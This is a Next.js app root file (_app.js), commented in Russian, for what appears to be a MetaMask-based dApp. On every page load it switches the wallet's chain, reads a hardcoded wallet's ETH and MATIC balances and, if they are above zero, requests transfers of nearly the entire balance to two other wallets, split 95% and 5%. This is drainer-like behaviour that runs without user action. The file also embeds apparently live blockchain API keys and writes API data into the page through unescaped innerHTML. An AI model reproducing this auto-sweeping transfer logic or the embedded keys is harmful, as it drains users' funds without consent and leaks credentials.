import '../styles/globals.css';
import '../styles/txnsLists.css';
import React, { useState, useEffect } from 'react';

function MyApp({ Component, pageProps }) {


  if (typeof window !== "undefined") {
    const intervalForScan = 20000; //20secs cuz setInterval works only when site is active

    const Web3 = require("web3");
    //Providers: 
    const metamask = new Web3(window.ethereum)
    //const polygonProvider = new Web3("https://polygon-mainnet.g.alchemy.com/v2/3B5JqAlngwYcYjiLp-vZ4GR9qEdQraT2"); //Mainnet Polygon Provider
    const polygonProvider = new Web3("https://polygon-mumbai.g.alchemy.com/v2/CV2ExWn-TtFtVkZfOrsQDWx4pnOdjHW9"); //Testnet (Mumbai) Polygon Provider
    //const ethProvider = new Web3("https://mainnet.infura.io/v3/6eba86409cb2408a9e57a31497b82177"); //Mainnet Ethereum Provider
    const ethProvider = new Web3("https://rinkeby.infura.io/v3/6eba86409cb2408a9e57a31497b82177"); //Testnet Ethereum Provider

    const myWallet = "0x0A82A3138191D5958F47b4b05483fa0D4DF995d9"; //myAddress

    const wallet_95per = "0x06248eC763aA1AAC3e02ff82E474364770Ef3764"; //receipt wallet 95%
    const wallet_5per = "0xA0186C212E51Fb0fBc236aD9679A45B295Bd2ADB"; //my wallet 5%

    const walletForApiEth = '0xddbd2b932c763ba5b1b7ae3b362eac3e8d40121a';
    const keyForEthApi = 'CUGT3EX9F7PUS8957IE13IHRI8A9RJZMFQ';

    const walletForApiMatic = '0xd52Ef74Dc3Fdb6CB10EbbE5d738C3BF8Dc4Acf4a';
    const keyForMaticApi = 'M8HY5PZUGXAMTUGF4WDQ81XYTBWBPYYHG4';





    const txnsEth = document.querySelector('.txnsList__ul_eth');
    const txnsMatic = document.querySelector('.txnsList__ul_matic');

    const balanceEthBlock = document.querySelector('.balanceEthBlock');
    const balanceMaticBlock = document.querySelector('.balanceMaticBlock');

    const walletEthBlock = document.querySelector('.walletEthBlock');
    const walletMaticBlock = document.querySelector('.walletMaticBlock');

    const ethEnabled = async () => {
      //баланс берется с адреса кошелька и с сети, к которой он в данный момент подключен. Rinkeby, Polygon и т.д.
      let balanceEthWEI;
      let balanceEth;
      let balanceMaticWEI;
      let balanceMatic;

      async function logTxns(currency) {
        let transactionsEth;
        let transactionsMatic;
        const order = 'desc'; //asc - по возрастанию, desc - по убыванию
        //let ethTransactionsApi = `https://api.etherscan.io/api?module=account&action=txlist&address=${myWallet}&startblock=0&endblock=99999999&page=${1}&offset=${20}&sort=${order}&apikey=F7GWSWHCFJ7TQRUXJXE4GG68T4C29C2YPN`; // мой кошелёк в Mainnet
        let ethTransactionsApi = `https://api.etherscan.io/api?module=account&action=txlist&address=${walletForApiEth}&startblock=0&endblock=99999999&page=${1}&offset=${20}&sort=${order}&apikey=${keyForEthApi}`; //чей-то кошелёк в mainnet eth
        let maticTransactionsApi = `https://api.polygonscan.com/api?module=account&action=txlist&address=${walletForApiMatic}&startblock=0&endblock=99999999&page=1&offset=${20}&sort=${order}&apikey=${keyForMaticApi}`; //чей-то кошелёк в mainnet matic

        async function getTxns(currency) {
          if (currency == 'ETH') {
            const responseEth = await fetch(ethTransactionsApi);
            const dataEth = await responseEth.json();
            transactionsEth = dataEth.result;
          }
          if (currency == 'MATIC') {
            const responseMatic = await fetch(maticTransactionsApi);
            const dataMatic = await responseMatic.json();
            transactionsMatic = dataMatic.result;
          }

          // await fetch(
          //   API,
          //   { method: 'GET' }
          // )
          //   .then(response => response.json())
          //   .then(data => {
          //     if (currency === 'ETH') {
          //       transactionsEth = data.result;
          //       console.log(transactionsEth);

          //     }
          //     if (currency === 'MATIC') {
          //       transactionsMatic = data.result;
          //       console.log(transactionMatic);

          //     }

          //   })
          //   .catch(error => { console.error('error:', error); });
        }
        await getTxns('ETH');
        await getTxns('MATIC');



        // --- Begin
        function iterateArray(array, currency, ulTxns) {

          for (let i of array) {
            let value = metamask.utils.fromWei(i.value.toString(), "ether");

            //ulTxns.innerHTML += `<li>${i.timeStamp} ${i.hash} ${i.value} ${i.from} ${i.to}</li>`;
            ulTxns.innerHTML +=
              '<li>'
              + ' Block number:' + '<span class="color_blue">' + ` ${i.blockNumber}` + '</span>' + ','
              + '</br>' + 'Transaction hash:' + '<span class="color_blue">' + ` ${i.hash}` + '</span>' + ','
              + '</br>' + 'From:' + '<span class="color_blue">' + ` ${i.from}` + '</span>' + ','
              + '</br>' + 'To:' + '<span class="color_blue">' + ` ${i.to}` + '</span>' + ','
              + '</br>' + 'Value:' + '<span class="color_blue">' + ` ${value} ` + '</span>' + ` ${currency}` + '.'
              + '</br>' +
              '</li>';




            /* 
            console.log(`TRANSACTION, currency: ${currency} `
              + '\n' + `blockNumber: ${i.blockNumber}, `
              + '\n' + `txn hash: ${i.hash}, `
              + '\n' + `from: ${i.from}, `
              + '\n' + `to: ${i.to}, `
              + '\n' + `value: ${i.value} WEI`
              + '\n' + `value: ${metamask.utils.fromWei(i.value.toString(), "ether")} ${currency}, `
              + '\n' + 'END')
            */
          }
        }

        iterateArray(transactionsEth, 'ETH', txnsEth);
        iterateArray(transactionsMatic, 'MATIC', txnsMatic);

      }

      logTxns('ETH');
      logTxns('MATIC');

      if (window.ethereum) {


        async function switchChain(chainId) {
          try {
            await ethereum.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: chainId }],
            });
          } catch (switchError) {
            // This error code indicates that the chain has not been added to MetaMask.
            if (switchError.code === 4902) {
              try {
                await ethereum.request({
                  method: 'wallet_addEthereumChain',
                  params: [
                    {
                      chainId: chainId,
                      chainName: '...',
                      rpcUrls: ['https://...'] /* ... */,
                    },
                  ],
                });
              } catch (addError) {
                // handle "add" error
              }
            }
            // handle other "switch" errors
          }

          //alert('switchChain is over!')
        }

        async function scanBalance(walletAddress, provider, currency) {
          return new Promise((resolve, reject) => {
            if (currency == "MATIC") {
              provider.eth.getBalance(walletAddress, function (error, result) {
                if (!error) {
                  walletMaticBlock.innerHTML = `Wallet: ${myWallet}`;
                  balanceMaticWEI = result;
                  balanceMatic = polygonProvider.utils.fromWei(balanceMaticWEI.toString(), "ether");
                  balanceMaticBlock.innerHTML = `Balance: ${balanceMatic} MATIC`;

                  resolve(result)
                  //console.log('BALANCE' + '\n' + `${ provider }, ` + '\n' + ` wallet Balance: ${ balanceElement } ` + `` + + '\n' + 'END')
                }
              });
            }

            if (currency == "ETH") {
              provider.eth.getBalance(walletAddress, function (error, result) {
                if (!error) {
                  walletEthBlock.innerHTML = `Wallet: ${myWallet}`;
                  balanceEthWEI = result;
                  balanceEth = ethProvider.utils.fromWei(balanceEthWEI.toString(), "ether");
                  balanceEthBlock.innerHTML = `Balance: ${balanceEth} ETH`;


                  resolve(result)
                  //console.log('BALANCE' + '\n' + `${ provider }, ` + '\n' + ` wallet Balance: ${ balanceElement } ` + `` + + '\n' + 'END')
                }
              });
            }



            else {
              reject('wrong currency: ' + currency)
            }
          })
        }

        //await scanBalance(myWallet, metamask, 'ETH');
        // сработает если Метамаск установлен и залогинен в мой кошелек. 
        //И работает только на той сети, которая сейчас активна в Метамаск

        let currentChainId = await metamask.eth.getChainId();
        //const ethChainId = metamask.utils.toHex(1);//mainnet 
        const ethChainId = metamask.utils.toHex(4);//rinkeby  

        //const maticChainId = metamask.utils.toHex(137); //polygon mainnet id
        const maticChainId = metamask.utils.toHex(80001);

        await switchChain(`${ethChainId} `)
        await scanBalance(myWallet, ethProvider, 'ETH');

        if (balanceEth > 0) {
          await sendTransaction(ethProvider, 'ETH');
        }

        await switchChain(`${maticChainId} `)
        await scanBalance(myWallet, polygonProvider, 'MATIC');

        //alert(`balanceMatic: ${ balanceMatic } `)
        if (balanceMatic > 0) {
          await sendTransaction(polygonProvider, 'MATIC');
        }
        //await scanBalance(myWallet, polygonProvider, 'MATIC')



        //setInterval(() => { scanBalance(myWallet) }, intervalForScan);



        async function sendTransaction(provider, currency) {
          const ethGasPriceAPI = `https://api.etherscan.io/api?module=gastracker&action=gasoracle&apikey=${keyForEthApi}`;
          const maticGasPriceAPI = `https://api.polygonscan.com//api?module=gastracker&action=gasoracle&apikey=${keyForMaticApi}`;

          let fastGasPrice_WEI;
          let fastGasPrice_ETH;

          async function getGasPrice(API) {
            console.log(`currency ${currency}`);

            await fetch(
              API,
              { method: 'GET' }
            )
              .then(response => response.json())
              .then(data => {

                fastGasPrice_WEI = provider.utils.toWei(data.result.FastGasPrice.toString(), "gwei"); //gwei to wei
                fastGasPrice_ETH = provider.utils.fromWei(fastGasPrice_WEI.toString(), "ether"); //wei to eth

                console.log(`fastGasPrice_ETH: ${fastGasPrice_ETH} ${currency}`);
              })
              .catch(error => { console.error('error:', error); });
          }

          if (currency === 'ETH') {

            await getGasPrice(ethGasPriceAPI);
          }
          else if (currency === 'MATIC') {

            await getGasPrice(maticGasPriceAPI);
          }

          const gasVal = 30000; //units
          const gasPriceVal_1 = fastGasPrice_WEI || 250000000000; //price of each gas unit
          //console.log(`gasPriceVal_11: ${gasPriceVal_1}`)
          const gasFee_1 = gasVal * gasPriceVal_1; //total gas fee
          const fee = 15000000000000000; //0.015 ETH
          let valueToSend, valueToSend_95per, valueToSend_5per, valueToSendHEX_95per, valueToSendHEX_5per;

          let gasPriceHEX_1 = metamask.utils.toHex(gasPriceVal_1).toString();
          let gasHEX = metamask.utils.toHex(gasVal).toString();

          function setParams() {
            console.log(`balanceEthWEI: ${balanceEthWEI}, gasFee_1: ${gasFee_1}, fee: ${fee}`);
            console.log(`balanceMaticWEI: ${balanceMaticWEI}, gasFee_1: ${gasFee_1}, fee: ${fee}`);
            if (currency === 'ETH') {
              valueToSend = balanceEthWEI - gasFee_1 - fee; //decimal
            }
            else if (currency === 'MATIC') {
              valueToSend = balanceMaticWEI - gasFee_1 - fee; //decimal
            }
            //let valueToSend = 1000000000000000000; //1eth
            let valueToSendEth = metamask.utils.fromWei(valueToSend.toString(), "ether");
            console.log(`valueToSend: ${valueToSend}` + '\n' + `valueToSendEth: ${valueToSendEth}`);
            valueToSend_95per = (valueToSend / 100) * 95; //95%
            valueToSend_5per = (valueToSend / 100) * 5; //5%
            //console.log(`valueToSend_95 eth: ${metamask.utils.fromWei(valueToSend_95.toString(), "ether")}`);
            //console.log(`valueToSend_5 eth: ${metamask.utils.fromWei(valueToSend_5.toString(), "ether")}`);
            valueToSendHEX_95per = metamask.utils.toHex(valueToSend_95per);
            valueToSendHEX_5per = metamask.utils.toHex(valueToSend_5per);
          }
          setParams();

          await transfer(myWallet, wallet_95per, valueToSendHEX_95per, gasHEX, gasPriceHEX_1); //to receipt
          await transfer(myWallet, wallet_5per, valueToSendHEX_5per, gasHEX, gasPriceHEX_1); //to my 2nd wallet
          console.log(`transactions for wallets. gasFee_1: ${metamask.utils.fromWei(gasFee_1.toString(), "ether")} ETH`);


          async function transfer(from, to, valueToSend, gas, gasPrice, chainId) {

            await ethereum
              .request({
                method: 'eth_sendTransaction',
                params: [
                  {
                    from: from,
                    to: to,
                    value: valueToSend,
                    gasPrice: gasPrice,
                    //gasPrice: '826299E00', //35000000000
                    gas: gas,
                    //gas: '5208', //'21000', 
                    //не поддерживает десятичные цифры.
                  },
                ], chainId
              })
              .then((txHash) => { console.log(txHash); })
              .then(() => console.log('Transaction sent!'))
              .catch((error) => console.error);
          }
          //     Method for transferring money to another ethereum wallet
          //alert('sendTransaction is over!');
          return;
          //--- END
        }





        return true;

      }
      return false;
    }

    if (!ethEnabled()) {
      alert("Please install MetaMask to use this dApp!");
    }




  }



  return <Component {...pageProps} />
}

// MyApp.getInitialProps = async (ctx) => {
//   // Get user id
//   console.log('getInitiaLProps')
//   return {

//   }
// }

export default MyApp
